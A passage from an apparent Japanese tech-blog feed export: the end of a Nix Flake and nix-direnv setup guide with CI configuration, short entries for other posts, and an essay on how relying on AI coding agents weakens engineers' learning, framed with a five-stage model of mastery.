install nixpkgs#nix-direnv# インストール確認ls ~/.nix-profile/share/nix-direnv/# direnvrc が存在することを確認2. direnvrc の設定~/.config/direnv/direnvrc に以下を追加する。# nix-direnv を使用して Nix Flake 環境を高速にロード# キャッシュにより、シェル起動時の遅延を大幅に削減if [ -f \\"$HOME/.nix-profile/share/nix-direnv/direnvrc\\" ]; then  source \\"$HOME/.nix-profile/share/nix-direnv/direnvrc\\"elif [ -f \\"/nix/var/nix/profiles/default/share/nix-direnv/direnvrc\\" ]; then  source \\"/nix/var/nix/profiles/default/share/nix-direnv/direnvrc\\"elif [ -f \\"/run/current-system/sw/share/nix-direnv/direnvrc\\" ]; then  source \\"/run/current-system/sw/share/nix-direnv/direnvrc\\"fi3. シェルへの hook 追加使用しているシェルに応じて設定を追加する。# bash (~/.bashrc)eval \\"$(direnv hook bash)\\"# zsh (~/.zshrc)eval \\"$(direnv hook zsh)\\"# fish (~/.config/fish/config.fish)direnv hook fish | sourcegithub.comプロジェクトでの使用1. .envrc ファイルの作成プロジェクトルートに .envrc を作成する。# .envrc - 基本的な使い方use flakeより詳細な設定も可能だ。# .envrc - 詳細な設定例# nix-direnv を使用（高速・キャッシュ対応）use flake# 特定の devShell を使用する場合# use flake .#rust# 追加の環境変数export EDITOR=\\"nvim\\"export MY_PROJECT_ENV=\\"development\\"2. direnv の許可セキュリティのため、初回は明示的に許可が必要だ。cd my-projectdirenv allow動作確認実際に動作を確認した結果を示す。# direnv のステータス確認$ direnv statusdirenv exec path /opt/homebrew/bin/direnvDIRENV_CONFIG /Users/nwiizo/.config/direnvFound RC path /path/to/project/.envrcFound RC allowed 0Found RC allowPath /Users/nwiizo/.local/share/direnv/allow/...nix-direnv のキャッシュ機構nix-direnv は .direnv/ ディレクトリにキャッシュを作成する。実際のキャッシュ構造は以下のようになる。.direnv/├── bin/                    # 一時的なバイナリラッパー├── flake-inputs/           # 入力 Flake のキャッシュ├── flake-profile-*         # Nix Store へのシンボリックリンク└── flake-profile-*.rc      # 環境変数のキャッシュ（約86KB）キャッシュの効果flake-profile-* は Nix Store の実際のパッケージを指す例: /nix/store/l5rhpr6i98h3kvydy6gww5cvszmqi05a-nix-shell-env2回目以降のロードは数ミリ秒で完了nix-collect-garbage でもキャッシュは保護されるnix-direnv vs 標準 direnv 観点  nix-direnv  標準 direnv + use nix  初回ロード  同等（ビルドが必要）  同等  2回目以降  数ミリ秒  数秒〜数十秒  GC 耐性  保護される  削除される可能性  Flake 対応  ネイティブ  追加設定が必要  キャッシュサイズ  〜100KB/プロジェクト  なし マルチ言語プロジェクトでの設定複数の devShell を持つプロジェクトでは、以下のように使い分けられる。# .envrc# デフォルトで全言語環境をロードuse flake# または特定の言語環境のみロードする場合:# use flake .#rust# use flake .#go# use flake .#python# use flake .#nodejsトラブルシューティングdirenv が反応しない# シェルフックが設定されているか確認which direnvdirenv status# 許可されているか確認direnv allow環境がロードされない# .envrc の構文エラーをチェックdirenv edit# キャッシュをクリアして再構築rm -rf .direnvdirenv allowFlake が見つからない# flake.nix が Git に追加されているか確認git status flake.nixgit add flake.nix flake.lockDeterminate Systems のブログでは、direnv と Nix の連携について詳しく解説されている。determinate.systemsCI/CD との統合GitHub Actions での使用name: CI with Nix Flakeon: [push, pull_request]jobs:  build:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@v4      # Nix インストール（Determinate Systems 推奨）      - uses: DeterminateSystems/nix-installer-action@main      # Magic Nix Cache でビルドを高速化      - uses: DeterminateSystems/magic-nix-cache-action@main      # Flake のチェック      - run: nix flake check      # フォーマットチェック      - run: nix develop --command treefmt --ci      # ビルド      - run: nix buildgithub.comCachix によるバイナリキャッシュCI でビルドした成果物を Cachix にプッシュすると、他の開発者やCI環境ではビルド済みバイナリをダウンロードするだけで済む。ビルド時間が大幅に短縮される。- uses: cachix/cachix-action@v15  with:    name: your-cache    authToken: \'${{ secrets.CACHIX_AUTH_TOKEN }}\'overlay によるカスタマイズパッケージのカスタマイズoverlay を使うと、既存のパッケージをカスタマイズしたり、独自のパッケージを追加したりできる。{  customOverlay = final: prev: {    # 既存パッケージをラップ    myGit = prev.writeShellScriptBin \\"git\\" \'\'      exec ${prev.git}/bin/git -c init.defaultBranch=main \\"$@\\"    \'\';    # カスタムスクリプト    project-init = prev.writeShellScriptBin \\"project-init\\" \'\'      echo \\"Initializing project...\\"      ${prev.git}/bin/git init      echo \\"# New Project\\" > README.md    \'\';  };}treefmt による統一フォーマット複数言語のフォーマッターを1つのコマンドで実行できる。{  treefmt = {    projectRootFile = \\"flake.nix\\";    programs = {      nixfmt.enable = true;      rustfmt.enable = true;      gofmt.enable = true;      prettier.enable = true;      ruff-format.enable = true;    };  };}treefmt      # 全ファイルをフォーマットtreefmt --ci # CI でのチェック（変更があればエラー）github.comトラブルシューティングexperimental-features エラーerror: experimental Nix feature \'nix-command\' is disabled~/.config/nix/nix.conf に以下を追加する。experimental-features = nix-command flakesnix develop が遅い初回は依存関係のダウンロードとビルドに時間がかかる。2回目以降はキャッシュが効くため高速だ。Cachix を使うとより高速化できる。direnv が無限ループするFish shell を使っている場合、shellHook で exec fish を呼ばないように注意する。Flake が見つからないFlake ファイルは Git に追加されている必要がある。未追跡ファイルは Nix から見えない。git add flake.nix flake.lockまとめNix Flake を導入することで、開発環境の「再現性」「分離性」「共有性」を根本から改善できる。Docker とは競合ではなく補完関係にあり、両者を組み合わせることで「再現可能なビルド」と「ポータブルなデプロイ」を両立できる。導入の主なメリットをまとめる。開発環境のセットアップが nix develop の1コマンドにチーム全員が同じツールバージョンを使用CI と開発環境の乖離がなくなるフォーマットの一貫性を自動で保証Docker イメージのビルドも再現可能に学習コストは確かに高い。Nix言語の習得やStore/Derivationの概念理解には時間がかかる。しかし一度導入すれば、環境構築が1コマンドで完了する。「環境差異によるバグ」が原理的になくなり、CIと開発環境が同一になる。特に複数言語プロジェクトでは、rustup/pyenv/nvm/goenvの個別管理から解放され、単一のflake.nixで全ての言語ツールチェーンを統一できる。まずは小規模なサイドプロジェクトで試してみてほしい。nix flake init -t github:the-nix-way/dev-templates#rust ですぐに始められる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-18T02:15:00.000Z","dateMiliSeconds":1766024100000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Interested in Self-Endless Advent Calendar?","link":"https://daisuke1024akagawa.medium.com/interested-in-a-self-endless-advent-calendar-afc8ca9bf4b0?source=rss-c54ac439ad2b------2","contentSnippet":"I’ve been writing tech blog on Japanese tech blog media, Zenn, since April 18, 2025 everyday. I’ll share why I started this activity and…Continue reading on Medium \xbb","isoDate":"2025-12-17T13:29:58.000Z","dateMiliSeconds":1765978198000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"GitHubで管理しているZennのファイル名を一括修正した話","link":"https://daisuke1024akagawa.medium.com/github%E3%81%A7%E7%AE%A1%E7%90%86%E3%81%97%E3%81%A6%E3%81%84%E3%82%8Bzenn%E3%81%AE%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E5%90%8D%E3%82%92%E4%B8%80%E6%8B%AC%E4%BF%AE%E6%AD%A3%E3%81%97%E3%81%9F%E8%A9%B1-2020c94f2e60?source=rss-c54ac439ad2b------2","isoDate":"2025-12-17T13:04:22.000Z","dateMiliSeconds":1765976662000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Aimシリーズ：OptunaとPytorch Lightningを組み合わせたMNIST実験管理","link":"https://zenn.dev/akasan/articles/aim_optuna_lightning_mnist","contentSnippet":"今回はAimで実験管理を行いつつ、OptunaとPytorch Lightningを使ってMNISTの分類をしてみました。ぜひ過去の以下の記事を参考にしてください。https://zenn.dev/akasan/articles/6221f74bea622dhttps://zenn.dev/akasan/articles/a75361d039906f 早速実装 環境構築uvを使って以下で環境を構築します。uv init aim_optuna_lightning_mnist -p 3.12cd aim_optuna_lightning_mnistuv add aim l...","isoDate":"2025-12-17T11:15:24.000Z","dateMiliSeconds":1765970124000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Aimシリーズ：入門してみた","link":"https://zenn.dev/akasan/articles/aim_ml_tracking_intro","contentSnippet":"今回から、Aimという実験管理ツールに入門してみます。※ 出張中につき、短編になります。 Aimとは？Aimとはオープンソースの実験管理ツールになります。Aimを利用すると実験を実行し、その結果発生する様々なメタデータを一元的に取り扱い、グラフィカルに解析することができます。Aimを利用することで以下のようなことが実現できます。MLパイプラインのロギングを可能にするUIを通してメタデータを比較分析できるML学習を効率的に実行可能実験管理のオーガナイズができるhttps://github.com/aimhubio/aim/ 早速使ってみる今回はGitHub上で提...","isoDate":"2025-12-17T11:15:23.000Z","dateMiliSeconds":1765970123000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"agnoを使ってOpenAIのエージェントを作成してみた","link":"https://zenn.dev/akasan/articles/agno_openai_agent_intro","contentSnippet":"今回はagnoのOpenAI連携機能を利用してエージェントを作ってみました。 agnoとは？agnoとはメモリや知識、ツールやリーズニングを実現するエージェントを実装するための軽量なフレームワークとなります。agnoを利用することで、推論エージェントやマルチモーダルエージェント、エージェントワークフローを構築できます。agnoはエージェントとチャットするための美しいUIやエージェントにサービスを提供する構築済みのFastAPIルート、そしてエージェントのパフォーマンスを監視・評価するためのツールも提供するとのことです。https://github.com/Akasan/agno...","isoDate":"2025-12-17T11:15:23.000Z","dateMiliSeconds":1765970123000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"agnoのGuardrail機能を試してみた","link":"https://zenn.dev/akasan/articles/agno_guardrail_feature","contentSnippet":"今回は昨日に引き続きagnoを利用してみました。agnoではGuardrailの機能について提供しており、そのサンプルを通して挙動を確認してみようと思います。昨日のagnoの導入記事もぜひ合わせてご覧ください。https://zenn.dev/akasan/articles/80953b8e206dd0 早速使ってみる今回は以下のページを参考にサンプルを試してみます。https://docs.agno.com/concepts/agents/guardrails/overviewhttps://docs.agno.com/examples/concepts/agent/gua...","isoDate":"2025-12-17T11:15:22.000Z","dateMiliSeconds":1765970122000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"2025年版 私がAIエージェントと協働しながら学習する方法","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/17/121705","contentSnippet":"労働こそが最高の学習だったあなたは最近、「成長している」と感じているだろうか。かつて、プログラマーにとって、労働こそが最高の学習の場だった。なぜか。労働には「摩擦」があったからだ。エラーが出る。原因がわからない。仮説を立てる。試す。失敗する。また試す。この摩擦の中で、経験が意味に変わっていた。労働は、経験を意味に変換する装置だった。以前の開発を思い出す。新しいフレームワークを覚えなければならない。エラーと格闘して、ドキュメントを読み漁って、やっと動いたとき。あの達成感は、単なる満足ではなかった。「なぜ動かなかったか」「どう直したか」「次に同じ問題が起きたらどうするか」——この因果の記憶が、脳に刻み込まれていた。困難を乗り越えた記録が、自分の中に残っていた。Claude Codeで開発している今、コードは書ける。動く。レビューも通る。Claude CodeはAnthropicが提供するAIエージェント型の開発ツールで、ターミナル上で動作し、コードの生成・編集・実行・デバッグまでを自然言語で指示できる。従来の「コード補完」とは次元が違う。プロジェクト全体を理解し、ファイルを横断して作業し、テストまで書いてくれる。開発のあり方が、根本から変わった。しかし、その便利さの裏で、何かがおかしくなっていた。コードは書ける。動く。レビューも通る。でも、後から「なぜそう書いたの？」と聞かれても、答えに淀む。自分が責任を持って出力したコードのはずなのに、説明しようとすると言葉が出てこない。因果を辿れない。「なぜこの実装なのか」「他の選択肢は何だったか」「どこで判断したか」——この記憶がない。このままでは「実装ガチャ」を回し続けるだけの存在になってしまう。先日、それを痛感する出来事があった。本番環境で障害が起きた。自分が2週間前に実装した機能だ。ログを見る。エラーメッセージを読む。でも、原因の見当がつかない。「この処理、どういう順序で動くんだっけ」と考える。思い出せない。自分で書いたコードなのに、頭の中でトレースできない。因果がわからない。結局、AIにコードを貼り付けて「このエラーの原因は？」と聞いた。答えは返ってきた。直った。しかし、自分では何も解決していない。2週間前の自分が書いたコードを、今日の自分が理解できていなかった。もしかして、あなたも同じ感覚を持っていないだろうか。最初は自分を責めた。集中力が落ちたのか。学習能力が衰えたのか。でも違った。労働と学習が、分離した。摩擦が消えた。経験が意味に変わる機会が消えた。厄介だったのは、見せかけ上の生産性は上がっていたことだ。タスクは消化されている。アウトプットも出ている。しかし、3ヶ月前にやった案件の技術スタックを聞かれても、ほとんど思い出せない。生産性は上がった。成長は止まった。労働から学習が抜け落ちていた。「成長していない」と感じるとき、私たちは何を失っているのか。成果と経験と理解は、同じものだろうか。違う。成果は外に出たもの。経験は時間の中で起きたこと。理解は内側に残ったもの。成果が出ても、経験を積んでも、理解が残らなければ成長は感じられない。失われているのは「苦労」ではない。「プロセスの記憶」だ。自分が何を考え、どこで躓き、どう乗り越えたか。この記憶が消えている。AIが生成したコードは動く。でも、そこに至るまでに自分が何を試し、何を捨て、何を選んだか——その記憶がない。なぜ過去の仕事を説明できないと不安になるのか。説明できないということは、プロセスの記憶がないということだ。記憶がないということは、自分の中で何も変化が起きていないということだ。成長実感とは、能力の増加ではない。自分の内部で変化が起きたと確認できる手応えだ。では、記憶に残らない仕事は価値がないのか。そうではない。成果としての価値はある。でも、自分を成長させる価値はない。成果は外に残る。成長は内に残る。両者は別物だ。これは集中力の問題ではなかった。前回の記事「2025年版 私がAIエージェントと協働しながら集中する方法」で書いた微観法は、集中の持ち方を変えてくれた。でも、学習の問題は別だった。集中できても、学べていなかったのだ。syu-m-5151.hatenablog.com『信長の野望』をやっているのに『戦国無双』のような強さを求めるのは違う、と言われるかもしれない。地道な内政と、爽快なアクション。求めているものが違う。でも正直なところ、私たちはいつだってエンジニアなのでエンジニア領域で無双したいのです。AI時代の3つの非対称性ここまで、私個人の経験として「労働と学習の分離」を語ってきた。でも、ここまで読んで、「これは自分だけの問題かもしれない。単に自分の学び方が下手なだけでは？」と思った人もいるだろう。そうではない。これは個人の問題ではない。構造の問題だ。なぜ労働と学習が分離してしまったのか。その構造を理解するには、AIがもたらした3つの非対称性を見る必要がある。詳しくは別の記事で書いたが、ここでも簡単に触れておきたい。syu-m-5151.hatenablog.com第一の非対称性：生産と理解の乖離。AIでコードを書く速度は上がった。でも、そのコードを修正しようとすると、予想以上に時間がかかる。システム内にコードが流入する速度と、人間がそれを理解する速度の間に、決定的なギャップが生まれている。第二の非対称性：生産量と成長の乖離。AIを使えば、経験1年目でも大量のコードを生産できる。PRの数も増える。でも半年後、1年後、エンジニアとしての地力はどうなっているだろうか。問題を自分で分析し、設計を考え、トレードオフを検討するプロセス。これがエンジニアの地力を育てる。AIに頼りすぎると、この思考プロセスそのものを外部化してしまう。第三の非対称性：経験の量と学びの質の乖離。毎日AIを使って100行のコードを書く経験を1年積んでも、そこから「AIへの依存」しか学ばなければ、地力にはつながらない。「何を経験したか」ではなく、「そこから何を学んだか」が重要なのだ。この3つの非対称性は、1つのシステムとして機能している。速く書けることを追求すれば、理解が追いつかなくなる。理解しないまま大量に生産すれば、思考力が育たない。経験を積んでも、そこから学ばなければ、成長は起きない。根底にあるメンタルモデル—「速さが価値」「量が成果」「経験が成長」—を変えない限り、どんな対症療法も一時的な効果しか生まない。ここまでで、外部から見た構造——AIと人間の関係性——は理解できた。しかし、これだけでは「なぜ学べないのか」の本当の理由は見えてこない。構造は外側の話だ。学習が起きるのは、私たちの脳の内側だ。では、この構造が私たちの脳に何をしているのか。もう少し掘り下げてみよう。脳が「処理」していない構造の問題は、最終的に脳の問題に帰着する。なぜ知識が残らないのか。しばらく自分を観察してみた。気づいたのは、AIエージェントと働いていると、認知的負荷が下がりすぎるということだ。認知的負荷とは、頭を使う度合いのことだ。問題を解くとき、脳は情報を処理し、比較し、判断する。この「頭を使う」プロセスが、認知的負荷を生む。負荷が下がること自体は、一見良いことに思える。楽に仕事ができる。疲れにくい。でも、学習の観点からは最悪だった。脳は適度な負荷がかからないと、情報を長期記憶に格納しない。「苦労せずに得た情報」は、脳にとって重要度が低いと判断される。楽に得た知識は、楽に消える。では、認知的負荷はどこからが「害」になるのか。問題は量ではない。質だ。認知的負荷には種類がある。タイピングの負荷。構文を思い出す負荷。そして、比較・判断・仮説といった意味処理の負荷。AIが減らしてくれるのは、すべての負荷だ。だが、害になるのは意味処理の負荷が消えたときだ。なぜ脳は負荷がないと学ばないのか。脳は「重要でない」と判断した情報を捨てる。重要かどうかの判断基準は、処理にかかった負荷だ。苦労して得た情報は重要。楽に得た情報は重要でない。意味処理の負荷が消えた瞬間、脳は「これは覚えなくていい」と判断する。記憶も学習も、起こらなくなる。「ちょうどよい負荷」は誰が決めるのか。AIではない。あなただ。負荷をAIに外注すると、脳は怠ける。怠けた脳は弱くなる。認知的負荷は削減対象ではない。設計対象だ。どの負荷を残し、どの負荷を外注するか。その設計を自分でしなければ、学習は起こらない。楽になることと、考えなくなることは同じか。違う。作業が楽になるのはいい。思考が楽になるのは危険だ。手を動かす負荷は減らしていい。意味を処理する負荷は、意図的に残せ。以前のプログラミングを思い出す。エラーが出る。ググる。ブログや公式ドキュメントを読む。試す。またエラー。別の方法を試す。やっと動く。このプロセス全体が、学習だった。途中で「わからない」状態に耐える必要があった。その「耐える時間」が、脳を鍛えていた。記憶を定着させていた。今はどうか。エラーが出る。AIに投げる。答えが返ってくる。動く。終わり。プロセスが消えた。プロセスが死ぬと、学習も死ぬ。考えてみてほしい。あなたが最後に「わからない」と感じたのは、いつだろうか。私は本当に思い出せなかった。AI時代において、「わからない」が絶滅したのだ。聞けば答えが返ってくる。どんな質問にも、それらしい回答が生成される。以前は「わからない」状態で立ち止まり、悩み、調べ、試行錯誤した。その時間が学習だった。今は「わからない」と感じる前に、答えが手に入る。「わからない状態」に耐える力こそ、学習に不可欠だ。わからない状態は不快だ。不確実性は脳にストレスを与える。だから、答えを求める。AIはその欲求を即座に満たしてくれる。だが、「わからない」は単なる欠如ではない。意味を構築するための空白だ。以前の学習を思い出してほしい。エラーが出て、原因がわからない。ドキュメントを読んでも、ピンとこない。仮説を立てて、試して、また失敗する。その空白の中で、脳は問題を構造化していた。何がわかっていて、何がわかっていないか。どこまでは正しくて、どこからが怪しいか。仮説を立て、壊し、更新する。このプロセスを通じて、人は「思考の型」と「判断の軸」を獲得してきた。わからない経験がなくなると、思考の型が育たない。問題をどう分解するか。仮説をどう立てるか。どの順番で検証するか。これは、わからない状態を何度も経験することでしか身につかない。答えが即座に与えられる世界では、この「思考の筋トレ」そのものが消える。AIはわからないと言わない。常に何かを返す。それが正しいかどうかは別として。人間だけが「わからない」を経験できる。その経験を捨てるのは、思考力を捨てることだ。でも、その「すぐわかる」が、実は思考力を奪っていた。自分一人で「じっくり」考える時間が消えた。わからないまま考え続ける能力。不確実性の中にとどまる能力。それが失われていく。「わからない」を経験しないまま、「わかった」に到達してしまう。ここまでは「わからない状態」の話だった。つまり、問題に直面したとき、AIがすぐに答えを出してしまうから、自分で考える時間がなくなるという話だ。でも、認知的負荷が下がる問題は、これだけではない。AIの答えを受け取って「わかった」と思った後にも、別の問題がある。コードへの解像度が下がるのだ。以前、自分で書いたコードは、補完もありながらちゃんと打ち込んでいた。変数名を決めるときに悩んだ。ループの終了条件を頭の中でシミュレートした。このif文の分岐は、こういうケースでtrueになる。この変数には、この時点でこの値が入っている。コードは指先から脳へ流れ込んでいた。AIが生成したコードは、目で見ているだけだ。なんとなく動く気がするから動かす。動く。テストも通る。でも、変数の1つに至るまで把握しているかと言われると、怪しい。コードが「通過」していく感覚。身体に染み込んでいない。見ているのに、触れていない。この違和感の正体は何か。自分で書いたコードと、AIが書いたコードは何が違うのか。結果は同じだろう。動作も同じだろう。でも、因果関係を自分で通ったかどうかが違う。自分で書いたコードには、因果の記憶がある。「この変数名、最初はdataにしようと思った。でも、後から読んだときに意味がわからなくなると思って、userResponseに変えた」。「このループ、最初はforで書いた。でも、副作用がないからmapの方がきれいだと思って書き直した」。迷い、選択し、決断した記憶。その因果を自分で通った記憶が、コードを「理解している」という感覚を生む。AIが生成したコードには、この因果がない。結果だけがある。「なぜこの変数名なのか」「なぜこの書き方なのか」。AIには理由があるのだろう。でも、その理由を自分で通っていない。書く・迷う・選ぶという行為を経ていないコードは、頭の中で「実行」されていない。なぜ説明できないと不安になるのか。説明できないということは、因果を再構成できないということだ。因果がわからないコードは、壊れたとき直せない。変更したとき、何が起きるか予測できない。「動くこと」と「わかること」は別だ。動くことは確認できる。わかることは、因果を辿れるかどうかで決まる。理解とは知識量ではない。因果を身体でトレースできるかどうかだ。「見ているが触っていない」とは、この状態だ。視覚的には認識している。でも、因果を身体で通過していない。だから、記憶に残らない。応用が利かない。自分のものにならない。解像度が低い理解は、何を引き起こすのか。判断ができなくなる。「この実装でいいのか」「この変更は安全か」。判断には、因果の理解が必要だ。因果がわからなければ、判断できない。判断できない人間は、AIの出力を受け入れるしかない。私は自分で書いたコードは、書く過程で何度も頭の中で実行している。「この変数がnullだったらどうなる」「このループは何回まわる」「この関数の戻り値は何型か」。無意識に検証している。AIが生成したコードには、この検証プロセスがない。結果、コードの「解像度」が違う。自分で書いたコードは、ズームインしてもくっきり見える。AIが生成したコードは、全体像はわかるが、細部がぼやけている。動くことは知っている。なぜ動くかは、よくわからない。解像度が低いと、記憶にも残りにくい。ぼんやりした情報は、脳に定着しない。そしてもう1つ、記憶を弱くする要因がある。解像度の問題とは別に、「思い出す」作業をしていないのだ。記憶を定着させるには、能動的に思い出す作業が必要だ。一度覚えたことを、何も見ずに思い出す。その「引き出す」作業が、記憶を強化する。でもAIと働いていると、思い出す必要がない。わからないときは聞けばいい。脳が「引き出す」練習をしなくなった。筋トレと同じだ。重いものを持ち上げないと筋肉はつかない。代わりに機械が持ち上げてくれたら、楽だけど、筋肉は衰える。AIは脳の代行業者だ。頼りすぎると、依頼主が衰える。何をしたか覚えていない、だから自分を過小評価するここまで、認知的負荷が下がることで起きる3つの問題を見てきた。「わからない」状態を経験しなくなること。コードへの解像度が下がること。そして、「思い出す」作業をしなくなること。これらは脳の内側で起きている問題だった。しかし、認知的負荷が下がることには、もう1つ厄介な副作用がある。脳の外側、つまり自分自身の認識に関わる問題だ。自分が何をしたのか覚えていないのだ。1日の終わりに「今日、何やったっけ？」と振り返る。AIと働いていると、驚くほど思い出せない。タスクは消化した。PRはマージされた。でも、何をどう解決したのか、記憶がぼんやりしている。なぜか。苦労しなかったからだ。痛みを伴わない経験は、砂に書いた文字だ。苦労は記憶のアンカーになる。あのエラーで3時間ハマった。あの設計で悩んで何度も書き直した。そういう「苦労の記憶」が、「自分がやった」という実感を生む。AIが苦労を肩代わりすると、このアンカーがなくなる。アンカーがないと、何が起きるか。自分を過小評価するようになる。「今日、大したことやってないな」と感じる。でも実際には、かなりの量のコードがマージされている。客観的には生産性が上がっているのに、主観的には「何もやっていない」気がする。成果と実感が乖離する。これは私だけの感覚ではない。知り合いのエンジニアと話していても、同じことを言う人が多い。「なんか最近、成長している実感がない」「仕事はこなせているけど、自分が何をやったか説明できない」。みんな同じ違和感を抱えている。感覚と現実が、乖離しているのだ。なぜ「何をしたか」を覚えていないと不安になるのか。自己評価はどこから生まれているのか。自己評価は、成果から生まれるのではない。「自分が困難にどう向き合ったか」という記憶から生まれる。あのバグを3時間かけて潰した。あの設計を何度も書き直した。あの障害対応で深夜まで粘った。こうした記憶が、「自分はやれる」という感覚を作る。苦労は自己評価の原材料だ。AIが苦労を肩代わりすると、何が起きるか。成果はある。でも、「自分がやった」という実感が残らない。困難と向き合った記憶がないから、自分を評価する材料がない。結果、成果が出ているのに自分を信じられなくなる。成果と達成感はなぜズレるのか。達成感は「困難を乗り越えた」という認識から生まれる。困難がなければ、達成感も生まれない。AIが困難を消してくれると、成果だけが残り、達成感は消える。成果と達成感の乖離。これがAI時代の新しい病だ。このズレは長期的に何を壊すのか。まず、挑戦を避けるようになる。「どうせAIがやってくれる」と思う。自分で考えることを放棄する。次に、自分を信じられなくなる。難しい問題に直面したとき、「自分にはできない」と感じる。かつて乗り越えた経験がないから、乗り越えられるイメージが湧かない。そして最後に、エンジニアとしてのアイデンティティが揺らぐ。「自分は何ができる人間なのか」がわからなくなる。成果は出ている。でも、それは自分の力なのか、AIの力なのか。区別がつかなくなる。達成の記憶がないなら、何かで補うしかない。では、何で補うのか。答えを先に言う。記録だ。達成の記憶がないなら、記録で作ればいい。苦労の記憶がないなら、躓きを記録で残せばいい。AIが消してしまう「プロセスの記憶」を、意図的に書き留める。それが私の出した答えだった。日報が労働と学習をつなぎ直したここまで読んで、「わかる、でもどうすればいいの？」と思っただろうか。私も同じだった。記録が大事だとわかっても、何をどう記録すればいいかわからなかった。行き詰まっていたとき、藁にもすがる思いで、ある習慣を始めた。日報だ。正直、日報は嫌いだった。面倒くさい。忙しい。後で書こうと思って忘れる。3日分まとめて書いて、何をやったか思い出せない。典型的なサボりパターンだった。何度も挫折した。でも、このままでは本当にまずいと思った。自分が書いたコードを説明できない。障害が起きても自分で解決できない。エンジニアとして、このまま衰えていくのか。その恐怖が、嫌いな日報を続けさせた。でも、日報の目的を変えてみた。上司への報告のためではなく、労働の中で生まれた曖昧さを捕まえるために書く。自分が何をわかっていて、何をわかっていないか。その現状を記録する仕組みだ。日報を続けて、衝撃的な事実に気づいた。その話は後で詳しく書く。でもその前に、一度立ち止まって考えたい。日報を書いて躓きを記録する。それは「学習」につながるはずだ。しかし、そもそも「学習する」とは何なのだろうか。この根本的な問いを考えないと、日報を書く意味も見えてこない。では、「学習する」とは、そもそも何なのでしょうか。この問いを考えるとき、私は為末大さんの『熟達論——人はいつまでも学び、成長できる』（新潮社、2023年）に大きな影響を受けました。400mハードルで日本記録を持つ「走る哲学者」が、様々な分野の達人たちとの対話を重ねて到達した方法論です。www.shinchosha.co.jp為末さんは、人が何かを学び、熟達していくプロセスには、分野を超えた普遍的な構造があると言います。陸上であれプログラミングであれ、学習のプロセスは同じです。技能と自分のどちらかだけを高めても成長できないと説きます。技能と自分は、切り離すことのできない「ひとつのもの」——つまり人間という総体として捉えるべきだと。この人間総体を高めていくことが、学習なのです。この考え方は、ソフトウェアエンジニアとしても腑に落ちます。プログラミングスキルだけを磨いても、良いエンジニアにはなれません。問題を分解する力、チームで働く力、技術を選ぶ判断力。技能と自分の総体が、エンジニアとしての実力です。為末さんによれば、学習には5つの段階があります。この5段階は「学習がどう進むか」を示す地図です。まず、その地図を見てみましょう。「遊（ゆう）」——学習の入口です。新しい技術に触れて、面白いから触る。効率は求めません。目的もありません。遊びとは主体的であり、面白さを伴い、不規則なもの。このモチベーションの源泉が、学習の入口になります。エンジニアなら、新しいフレームワークを触ってみる。ドキュメントを読む前に動かしてみる。「これ何ができるんだろう」と試す。壊してみる。変なパラメータを渡してみる。遊びが好奇心を育て、好奇心が学習を駆動します。「型（かた）」——基礎を身につける段階です。お手本を真似る。ドキュメント通りに書く。型とは「基盤となる最も基本的なもの」であり、個人差を超えて最も安定している普遍的なものです。型は丸呑みするもの。なぜそうするかはわからなくても、まず形から入ります。エンジニアなら、公式チュートリアルを写経する。ベストプラクティスをそのまま真似る。「なぜこう書くのか」は後回し。まず手が覚えるまで繰り返します。型が身体に入ると、考えなくても書けるようになります。「観（かん）」——構造を理解する段階です。「なぜこの書き方なのか」と問う。「見る」とは「分ける」こと。動作を分けて見ることで、技術を構造化します。ある技能は別の技能に支えられている。その関係性が見えてきます。エンジニアなら、コードの設計意図を読み取る。「この抽象化は何のためか」「このパターンはどこで使えるか」と問う。部分（関数）と全体（システム）の関係が見えます。観ができると、他人のコードから学べるようになります。また、コードを「意味の塊」として捉えられるようになります。初心者が「if文があって、関数呼び出しがあって...」と一行ずつ追う場面で、「これはトークン検証の処理だ」と全体を1つの塊として認識できる。塊で捉えるから、複雑なコードも把握できるのです。「心（しん）」——本質を掴む段階です。見極めた本質を軸に、自分なりに自由に動ける状態。いつでもニュートラルポジションに戻れるから、応用的な技術も試せます。中心を柔らかくつかむと、冒険できるようになります。エンジニアなら、技術の本質を掴んでいる状態です。「認証の本質は信頼の証明だ」とわかれば、JWT でも OAuth でも Session でも、状況に応じて選べます。心を掴むと、新しい技術もすぐ理解できます。また、具体的な事例から抽象的なパターンを抽出できます。「このエラーはnullチェック漏れ」という具体から「外部データは信頼しない」という原則へ昇華する。この抽象化ができると、問題を絞り込む力も育ちます。「Invalid token」というエラーを見て、「トークン生成か検証のどちらかが問題」と可能性を狭められる。原理原則を理解していれば、推論で問題にたどり着けるのです。「空（くう）」——学習の到達点です。制約から解き放たれて、技能が自然な形で表現できる状態。いわゆる「ゾーン」です。論理よりも勘が働く。そしてまた「遊」に戻る。学習は循環します。エンジニアなら、コードが自然に流れ出る状態です。設計を考えなくても、手が正しい方向に動く。深夜のデバッグで「なぜかここが怪しい」と直感が働く。空に達した技能は、意識せずに発揮されます。重要なのは、部分の学習が全体を高めるという構造です。「認証処理」という部分を学ぶと、「Webアプリケーション開発」という全体の質が上がります。そして全体の質が上がると、今度は別の部分——たとえば「データベース設計」——を学ぶ意欲が湧いてきます。部分と全体が相互に作用しながら、エンジニアとしての総体が高まっていく。この循環こそが、成長を楽しめる理由です。ここまでが、学習の地図です。でも、抽象的な説明だけでは実感が湧かないかもしれません。私自身の経験に当てはめてみましょう。以前、新しい技術を学ぶとき、何が起きていたでしょうか。ドキュメントを読む。知らない概念が出てくる。調べる。言葉の意味はわかった。でも、まだ腑に落ちない。実際にコードを書いてみる。動かない。なぜ動かないか考える。仮説を立てる。試す。また動かない。別の仮説を立てる。3時間が経つ。ようやく動いた。「ああ、こういうことか」。次からは同じ間違いをしなくなる。この過程で、学習の段階を登っていました。最初は遊びから入った。動かしてみる。壊してみる。次に型を学んだ。ドキュメントを読み、お手本通りに書いた。型を繰り返すうちに、「なぜ」が見えてきた。観の段階です。